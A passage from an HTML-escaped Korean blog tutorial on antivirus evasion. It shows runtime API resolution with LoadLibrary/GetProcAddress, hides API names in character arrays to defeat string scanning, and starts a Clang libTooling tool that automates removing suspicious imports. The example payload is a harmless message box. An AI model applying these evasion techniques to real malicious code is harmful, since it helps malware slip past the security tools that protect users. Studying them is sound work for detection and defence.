&#xD568;&#xC218;&#xAC00; <code>User32.dll</code>&#xC5D0;&#xC11C; &#xB0B4;&#xBCF4;&#xB0B4;&#xC9C4; &#xB2E4;&#xACE0; &#xC124;&#xBA85;&#xD55C;&#xB2E4;.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/1.png" alt></p><p>MessageBoxA API&#xB294; <code>User32.dll</code>&#xC5D0;&#xC11C; &#xB0B4;&#xBCF4;&#xB0B4; &#xC9C4;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xC774; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xBA3C;&#xC800; &#xB85C;&#xB4DC;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><pre><code class="hljs cpp">HANDLE hUser32 = LoadLibrary(<span class="hljs-string">&quot;User32.dll&quot;</span>);</code></pre><p>&#xADF8; &#xD6C4; <code>GetProcAddress</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC704;&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xD55C; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xC5D0; &#xC815;&#xD655;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; &#xD560;&#xB2F9;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp">_MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; &#xC6D0;&#xB798; &#xC608;&#xB97C; <code>MessageBoxA</code> &#xB300;&#xC2E0; <code>fMessageBoxA</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xD574;&#xC57C; &#xD558;&#xBA70; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>{    HANDLE hUser32 = LoadLibraryA(<span class="hljs-string">&quot;User32.dll&quot;</span>);    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p><code>HWND, LCTSTR, UINT</code> &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xC744; &#xC704;&#xD574; <code>Windows.h</code> include&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;. &#xC774; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C;&#xB97C; &#xBE4C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC608;&#xC0C1;&#xB300;&#xB85C; alert box&#xAC00; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/2.png" alt></p><p>run-time dynamic linking&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574; <code>LoadLibrary</code>&#xC640; <code>GetProcAddress</code>&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC2DC;</p><h3 id="&#xCD5C;&#xC885;-&#xC801;&#xC6A9;"><a href="#&#xCD5C;&#xC885;-&#xC801;&#xC6A9;" class="headerlink" title="&#xCD5C;&#xC885; &#xC801;&#xC6A9;"></a>&#xCD5C;&#xC885; &#xC801;&#xC6A9;</h3><p><code>strings toto.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC544;&#xC9C1; <code>User32.dll</code>&#xACFC; <code>MessageBoxA</code> &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xB098;&#xD0C0;&#xB09C;&#xB2E4;. &#xC774; &#xBB38;&#xC790;&#xC5F4;&#xB4E4;&#xC740; &#xC554;&#xD638;&#xD654;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; &#xBCF4;&#xC5EC;&#xC900; &#xAC04;&#xB2E8;&#xD55C; &#xB09C;&#xB3C5;&#xD654; &#xD2B8;&#xB9AD;&#xC73C;&#xB85C; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4; &#xD0D0;&#xC9C0;&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xCD5C;&#xC885; &#xACB0;&#xACFC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>{    <span class="hljs-keyword">char</span> user32[] = {<span class="hljs-string">&apos;U&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,<span class="hljs-string">&apos;3&apos;</span>,<span class="hljs-string">&apos;2&apos;</span>,<span class="hljs-string">&apos;.&apos;</span>,<span class="hljs-string">&apos;d&apos;</span>,<span class="hljs-string">&apos;l&apos;</span>,<span class="hljs-string">&apos;l&apos;</span>,<span class="hljs-number">0</span>};    HANDLE hUser32 = LoadLibraryA(user32);    <span class="hljs-keyword">char</span> messabox[] = {<span class="hljs-string">&apos;M&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;s&apos;</span>,<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;g&apos;</span>,<span class="hljs-string">&apos;e&apos;</span>,<span class="hljs-string">&apos;B&apos;</span>,<span class="hljs-string">&apos;o&apos;</span>,<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;A&apos;</span>,<span class="hljs-number">0</span>};    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, messabox);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; <code>strings</code>&#xC640; <code>rabin2</code> &#xB458; &#xB2E4; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xB2E4;.</p><pre><code class="hljs cpp">&#x279C;  x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe&#x279C;  strings /tmp/toto.exe | grep MessageBox&#x279C;  rabin2 -zz /tmp/toto.exe | grep MessageBox&#x279C;</code></pre><h2 id="&#xC790;&#xB3D9;&#xD654;&#xB41C;-&#xC18C;&#xC2A4;-&#xCF54;&#xB4DC;-&#xB9AC;&#xD329;&#xD130;&#xB9C1;"><a href="#&#xC790;&#xB3D9;&#xD654;&#xB41C;-&#xC18C;&#xC2A4;-&#xCF54;&#xB4DC;-&#xB9AC;&#xD329;&#xD130;&#xB9C1;" class="headerlink" title="&#xC790;&#xB3D9;&#xD654;&#xB41C; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC; &#xB9AC;&#xD329;&#xD130;&#xB9C1;"></a>&#xC790;&#xB3D9;&#xD654;&#xB41C; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC; &#xB9AC;&#xD329;&#xD130;&#xB9C1;</h2><p>&#xC774;&#xC804; &#xAE00;&#xC5D0; &#xC124;&#xBA85;&#xB41C; &#xAC83;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xAE30;&#xC874; &#xCF54;&#xB4DC; &#xBCA0;&#xC774;&#xC2A4;&#xB97C; refactoring &#xD558;&#xC5EC; &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4; API&#xB97C; &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; &#xB85C;&#xB4DC;&#xD558;&#xACE0; Import Address Table&#xC5D0;&#xC11C; &#xC81C;&#xAC70;&#xD560; &#xC218; &#xC788;&#xB2E4;. <code>libTooling</code>&#xC73C;&#xB85C; &#xAD6C;&#xD604;&#xB41C; &#xAE30;&#xC874;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD560; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xC774; &#xC791;&#xC5C5;&#xC744; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB098;&#xC5F4;&#xD574;&#xBCF4;&#xC790;.</p><ul><li>&#xC774;&#xC804; &#xC608;&#xC81C;&#xC758; &#xCD94;&#xC0C1; &#xAD6C;&#xBB38; &#xD2B8;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xB77C;. &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xC218;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB178;&#xB4DC;&#xB97C; &#xC870;&#xC791;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC774;&#xD574;&#xD558;&#xB294;&#xB370; &#xD544;&#xC694;&#xD558;&#xB2E4;.</li><li><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC9C0;&#xC815;&#xB41C; API&#xC5D0; &#xB300;&#xD55C; API &#xCF54;&#xB4DC; &#xBCA0;&#xC774;&#xC2A4;&#xC758; &#xBAA8;&#xB4E0; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xCC3E;&#xC544;&#xB77C;.</li><li>&#xB2E4;&#xB978; &#xD568;&#xC218; &#xC2DD;&#xBCC4;&#xC790;&#xB85C; &#xBAA8;&#xB4E0; &#xD638;&#xCD9C;&#xC744; &#xB300;&#xCCB4;&#xD574;&#xB77C;.</li><li>&#xAC01; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC804;&#xC5D0; <code>LoadLibrary/GetProcAddress</code> &#xD638;&#xCD9C;&#xC744; &#xC0BD;&#xC785;&#xD558;&#xB77C;.</li><li>&#xC791;&#xB3D9;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xB77C;.</li><li>&#xBAA8;&#xB4E0; &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4; API&#xB97C; &#xC885;&#xD569;&#xD558;&#xACE0; &#xB09C;&#xB3C5;&#xD654;&#xD574;&#xB77C;.</li></ul><h3 id="MessageBox-&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758;-&#xCD94;&#xC0C1;-&#xAD6C;&#xBB38;-&#xD2B8;&#xB9AC;"><a href="#MessageBox-&#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758;-&#xCD94;&#xC0C1;-&#xAD6C;&#xBB38;-&#xD2B8;&#xB9AC;" class="headerlink" title="MessageBox &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xCD94;&#xC0C1; &#xAD6C;&#xBB38; &#xD2B8;&#xB9AC;"></a>MessageBox &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xCD94;&#xC0C1; &#xAD6C;&#xBB38; &#xD2B8;&#xB9AC;</h3><p>&#xC6D0;&#xBCF8; MessageBox &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; Clang &#xCD94;&#xC0C1; &#xAD6C;&#xBB38; &#xD2B8;&#xB9AC;&#xB97C; &#xBCF4;&#xAE30; &#xC704;&#xD574; &#xB2F9;&#xC2E0;&#xC758; Windows SDK &#xACBD;&#xB85C;&#xB97C; &#xC801;&#xC6A9;&#xD558;&#xC5EC; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC790;</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/dev/avcleaner&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><pre><code class="hljs bash">bash clang-astdump.sh <span class="hljs-built_in">test</span>/messagebox_simple.c &gt; <span class="hljs-built_in">test</span>/messagebox_simple.c.ast</code></pre><p><img src="/2020/12/13/idioth/av_evasion_part2/3.png" alt></p><p>MessageBoxA API&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC04;&#xB2E8;&#xD55C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; Clang &#xCD94;&#xC0C1; &#xAD6C;&#xBB38; &#xD2B8;&#xB9AC;</p><p>CallExpr &#xC720;&#xD615;&#xC758; AST &#xB178;&#xB4DC;&#xB97C; &#xCC3E;&#xC73C;&#xBA74; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xC758; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;. &#xC704; &#xC0AC;&#xC9C4;&#xC5D0; &#xB098;&#xC640;&#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xC2E4;&#xC81C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218; &#xC774;&#xB984;&#xC740; &#xD558;&#xC704; &#xB178;&#xB4DC; &#xC911; &#xD558;&#xB098;&#xC5D0; &#xC9C0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xB098;&#xC911;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;.</p><h3 id="&#xD2B9;&#xC815;-API&#xC758;-&#xD568;&#xC218;-&#xD638;&#xCD9C;-&#xCC3E;&#xAE30;"><a href="#&#xD2B9;&#xC815;-API&#xC758;-&#xD568;&#xC218;-&#xD638;&#xCD9C;-&#xCC3E;&#xAE30;" class="headerlink" title="&#xD2B9;&#xC815; API&#xC758; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xCC3E;&#xAE30;"></a>&#xD2B9;&#xC815; API&#xC758; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xCC3E;&#xAE30;</h3><p><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>&#xB294; &#xD2B9;&#xC815; &#xD568;&#xC218;&#xC5D0; &#xB300;&#xD55C; &#xBAA8;&#xB4E0; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xC5F4;&#xAC70;&#xD558;&#xB294;&#xB370; &#xD544;&#xC694;&#xD558;&#xB2E4;. &#xC6B0;&#xC120; &#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C; &#xAC83;&#xBCF4;&#xB2E4; &#xB354; &#xBCF5;&#xC7A1;&#xD558;&#xBBC0;&#xB85C; &#xC774; matcher&#xC5D0; &#xB9DE;&#xB294; &#xAD6C;&#xBB38;&#xC744; &#xC5BB;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD558;&#xB2E4;. &#xC801;&#xD569;&#xD55C; &#xAC83;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; custom query&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; interactive tool&#xC778; <code>clang-query</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xB2E4;. &#xD765;&#xBBF8;&#xB86D;&#xAC8C;&#xB3C4; &#xC774;&#xAC83;&#xC740; libTooling &#xAE30;&#xBC18;&#xC774;&#xACE0; &#xC774; &#xAE00;&#xC5D0;&#xC11C; &#xBCF4;&#xC5EC;&#xC900; &#xC5B4;&#xB5A4; &#xAC83;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xAC15;&#xB825;&#xD558;&#xB2E4;.</p><pre><code class="hljs bash">clang-query&gt; match callExpr(callee(functionDecl(hasName(<span class="hljs-string">&quot;MessageBoxA&quot;</span>))))Match <span class="hljs-comment">#1:</span>/Users/vladimir/dev/scrt/avcleaner/<span class="hljs-built_in">test</span>/messagebox_simple.c:6:5: note: <span class="hljs-string">&quot;root&quot;</span> binds here    MessageBoxA(NULL, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~1 match.clang-query&gt;</code></pre><p>&#xC2DC;&#xD589;&#xCC29;&#xC624;&#xC640; &#xBA85;&#xB839; &#xC904; &#xC644;&#xC131;(tab completion)&#xC73C;&#xB85C; &#xBE60;&#xB974;&#xAC8C; &#xC791;&#xC5C5; &#xC194;&#xB8E8;&#xC158;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB2E4;. matcher&#xAC00; &#xC798; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC73C;&#xB2C8; &#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xD55C; &#xAC83;&#xACFC; &#xAC19;&#xC740; &#xC0C8;&#xB85C;&#xC6B4; <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB2E4;. <code>clang-query</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC218;&#xD589;&#xD55C; &#xAC83;&#xC744; C++ &#xC7AC;&#xD604;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiCallConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer {<span class="hljs-keyword">public</span>:    ApiCallConsumer(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiName, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeDef, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Library)            : _ApiName(<span class="hljs-built_in">std</span>::move(ApiName)), _TypeDef(<span class="hljs-built_in">std</span>::move(TypeDef)), _Library(<span class="hljs-built_in">std</span>::move(Library)) {}    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>{                <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> AVObfuscator;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[ApiCallObfuscation] Registering ASTMatcher for &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">ApiMatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter, _ApiName, _TypeDef, _Library)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = callExpr(callee(functionDecl(hasName(_ApiName)))).bind(<span class="hljs-string">&quot;callExpr&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    }<span class="hljs-keyword">private</span>:    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _ApiName;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _TypeDef;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _Library;};</code></pre><p>&#xC911;&#xC694;&#xD55C; &#xAD6C;&#xD604; &#xC138;&#xBD80; &#xC0AC;&#xD56D;&#xC740; &#xB9CE;&#xC740; &#xB2E4;&#xB978; &#xD568;&#xC218;&#xB4E4;&#xC5D0; &#xC801;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC00;&#xB2A5;&#xC131;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xAC83;&#xC774;&#xACE0; &#xCD5C;&#xC885;&#xC801;&#xC778; &#xBAA9;&#xD45C;&#xB294; &#xAC01; &#xC218;&#xC815;&#xB41C; API &#xD568;&#xC218;&#xC5D0; <code>LoadLibrary/GetProcAddress</code>&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xAC83;&#xC774;&#xBBC0;&#xB85C; &#xD568;&#xC218; &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785;&#xACFC; DLL &#xC774;&#xB984;&#xC744; &#xC81C;&#xACF5;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p>&#xADF8;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xC218;&#xC815;&#xD560; API&#xB9CC;&#xD07C; &#xB9CE;&#xC740; <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumers</a>&#xB97C; &#xB4F1;&#xB85D;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774; <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xD654;&#xB294; <a href="https://clang.llvm.org/doxygen/classclang_1_1FrontendAction.html">ASTFrontendAction</a>&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB418;&#xC57C;&#xB9CC; &#xD55C;&#xB2E4;:</p><p><img src="/2020/12/13/idioth/av_evasion_part2/4.png" alt></p><p><code>main.cpp</code>&#xC758; &#xC8FC;&#xC694; &#xBCC0;&#xACBD;&#xC810;.</p><p>&#xC774;&#xAC83;&#xC740; &#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; &#xC791;&#xC5C5;&#xD55C; &#xAE30;&#xC874; &#xCF54;&#xB4DC;&#xC5D0; &#xB300;&#xD55C; &#xC720;&#xC77C;&#xD55C; &#xBCC0;&#xACBD;&#xC810;&#xC774;&#xB2E4;. &#xC6B0;&#xB9AC;&#xAC00; &#xCD94;&#xAC00;&#xD560; &#xCF54;&#xB4DC;&#xB4E4;&#xC740; <code>ApiMatchHandelr.cpp</code>&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xAC83;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD55C;&#xB2E4;.</p><p>matcher&#xB294; &#xCF5C;&#xBC31; &#xD568;&#xC218;&#xC640; &#xD568;&#xAED8; &#xC81C;&#xACF5;&#xB418;&#xBBC0;&#xB85C; &#xB2E4;&#xC74C; &#xD558;&#xB098;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xC790;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ApiMatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>{    llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Found &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *CallExpression = Result.Nodes.getNodeAs&lt;clang::CallExpr&gt;(<span class="hljs-string">&quot;callExpr&quot;</span>);    handleCallExpr(CallExpression, Result.Context);}</code></pre><p>&#xC139;&#xC158;&#xC758; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xB9AC;&#xC2A4;&#xD2B8;&#xB85C; &#xBD84;&#xB9AC;&#xB41C; &#xC791;&#xC5C5;&#xB4E4;&#xC740; &#xC544;&#xB798; &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xCF54;&#xB4DC;&#xB85C; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span></span>;<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span></span>;<span class="hljs-keyword">bool</span>addGetProcAddress(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,                    <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName);<span class="hljs-function">clang::SourceRange <span class="hljs-title">findInjectionSpot</span><span class="hljs-params">(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> clang::CallExpr &amp;Literal, <span class="hljs-keyword">uint64_t</span> Iterations)</span></span>;</code></pre><h3 